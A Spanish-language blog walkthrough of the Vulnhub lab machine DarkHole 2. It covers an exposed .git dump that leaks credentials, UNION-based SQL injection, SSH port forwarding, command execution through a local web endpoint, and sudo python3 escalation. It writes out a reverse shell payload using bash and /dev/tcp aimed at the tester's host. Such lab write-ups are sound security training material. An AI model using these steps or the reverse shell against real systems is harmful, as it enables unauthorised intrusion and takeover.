---
layout: single
title: DarkHole 2 - Vulnhub
excerpt: "Para resolver esta máquina nos dimos cuenta qué a la hora del escaneo con Nmap nos reportó que el repositorio .Git estaba expuesto, nos aprovechamos de esto para ver los commit's, en unos de los commits obtendríamos credenciales en texto claro para acceder en la página Web como el desarrollador Web, posterior a ello llevamos a cabo un SQLI basada en UNION para obtener credenciales SSH, una vez dentro podíamos ver el historial descubriendo así servicio web internos de los cuales abusamos para convertinos en usuario privilegiado."
date: 11/11/2023
classes: wide
header:
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp

tags:
  - Information Leakage
  - GitHub Project Enumeration > creds
  - SQLI
  - ssh (Remote Port Forwarding)
  - abusing Internal Web Server
  - bash History - Information Leakage
  - abusing sudoers
---

Para resolver esta máquina nos dimos cuenta qué a la hora del escaneo con Nmap nos reportó que el repositorio .Git estaba expuesto, nos aprovechamos de esto para ver los commit's, en unos de los commits obtendríamos credenciales en texto claro para acceder en la página Web como el desarrollador Web, posterior a ello llevamos a cabo un SQLI basada en UNION para obtener credenciales SSH, una vez dentro podíamos ver el historial descubriendo así servicio web internos de los cuales abusamos para convertinos en usuario privilegiado.


# PortScan
____

```
# Nmap 7.93 scan initiated Sat Nov 11 10:30:18 2023 as: nmap -sCV -p22,80 -oN targeted 192.168.204.160
Nmap scan report for 192.168.204.160
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57b1f564289891516d70766ea552435d (RSA)
|   256 cc64fd7cd85e488a289891b9e41e6da8 (ECDSA)
|_  256 9e7708a4529f338d9619ba757127bd60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   192.168.204.160:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-title: DarkHole V2
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:DB:9D:4B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 11 10:30:25 2023 -- 1 IP address (1 host up) scanned in 7.00 seconds
```


Vemos qué está expuesto el repositorio **Git**

# WebSite
___


![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111125625.png)


No vemos nada sospechoso de primera, así qué procedemos a obtener el repositorio **Git** qué nos reportó el **Nmap** en local, con la herramienta [Git-Dumper](https://github.com/arthaud/git-dumper) para obtener lo qué parece ser el código fuente & ver sí podemos aprovecharnos de algo.
```bash
 ./git_dumper.py http://192.168.204.160/.git ~/192.168.204.160
```

Teniendo así en local el repositorio .**GIT.**

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111130205.png)
Otra forma de obtener los recursos **.git** en local, es con "wget".
```bash
wget -r http://192.168.204.160/.git/
```

Sí leemos el "**COMMIT_EDITMSG**" vemos qué se hizo un commit con nombre "**i changed login.php file for more secure**", así que podríamos tratar de ver como era el **login.php** antes del commit, logrando así verlo como era antes.

1. Vemos los log's commits hechos.
```bash
git log
```
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111131806.png)
Este commit tiene mala apariencia, porque aparentemente agregaron el login.php con las credentials default.

2. Entramos al commit qué nos interesa.
```bash
git show a4d900a8d85e8938d3601f3cef113ee293028e10
```

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111131937.png)

Logrando ver así las credenciales default en texto claro.


Probamos loguearnos con estas credenciales en el sitio web.

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111132127.png)


# SQL Injection
____



![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111132136.png)

Hemos entrado como el usuario **Jehad Alqurashi**, qué aparentemente es desarollador web.

Buscando vulnerabilidades o de qué podríamos aprovecharnos de primera no encontré nada, pero fijandome en la **URL** ví qué probablemente sea vulnerable a **Inyecciones SQL**, así qué empiezo probando con un **sleep**.
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111132414.png)

Logrando así que dure 5 segundos en responder, esto confirmándonos que esta página es vulnerable a **Inyecciones SQL**, así que podríamos intentar ver credenciales de las base de datos de la página web.

1. Identificamos el número de columnas
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111132945.png)

2. Vemos las bases de Datos existentes.
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111133102.png)

3. Ver tablas existente de la DB qué nos interesa.
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111133205.png)

4. Ver columnas de la tabla que nos interesa.
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111133410.png)

5. Ver contenido de las columnas qué nos interesan.
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111133551.png)

Obteniendo así lo qué parece ser credenciales para conectarnos a través de SSH.

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111133724.png)
___


# Escalada de Privilegios #1
____



Indagando, descubrimos qué el historial no tiene un enlace simbólico al **"/dev/null"**, por lo qué podríamos tratar de ver sí contiene algo de lo que podrimos aprovecharnos.

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111134155.png)

Encontramos qué local de la máquina por el puerto **:9999** sé está usando un código para mediante los parámetros "**?cmd=**'" indicar qué comandos se quieren ejecutar.

De primera pienso que eso lo ejecuta el mismo usuario del sistema "**jehad**", pero para corroborarlo hago un **Remote Port Forwarding** para que el **:9999** de la máquina víctima sea el **:9999** de mi máquina, esto a través de SSH tal que así.
```bash
ssh jehad@192.168.204.160 -L 9999:127.0.0.1:9999
```

De forma qué entro al 9999 en local, y utilizó los parámetros que nos chivó el historial de Bash, ejecutando un "whoami"
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111141545.png)

Para mi sorpresa, el **RCE** lo ejecuta el usuario "**losy**", por lo qué se me ocurre migrar a este usuario mediante una **Reverse Shell,** esto a ver sí encontramos otra forma de migrar a ROOT.

```bash
http://localhost:9999/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.204.130/443 0>%261"
```

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111141841.png)

Ahora quedaría darle **Tratamiento a la TTY**, sino sabemos como te recomiendo [((CLICKEAR AQUÍ))](https://4uli.github.io/tratamiento-tty/)

________

# Escalada de Privilegios #2
____


Estando como "**Losy**", también podemos ver el historial de Bash, así qué echándole un ojo encontraríamos las credenciales de la misma **Losy**.

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111142208.png)

Por lo qué se me ocurre ver los permisos **SUDOERS**.

![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111142324.png)

Encontraríamos que tenemos permisos **SUDOERS** como ROOT para python3, por lo qué podríamos aprovecharnos de esto para escalar nuestro privilegio.

1. Abrimos Python3 como Root.
```bash
sudo /usr/bin/python3
```

2. Colocamos las siguientes líneas:
![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111142707.png)
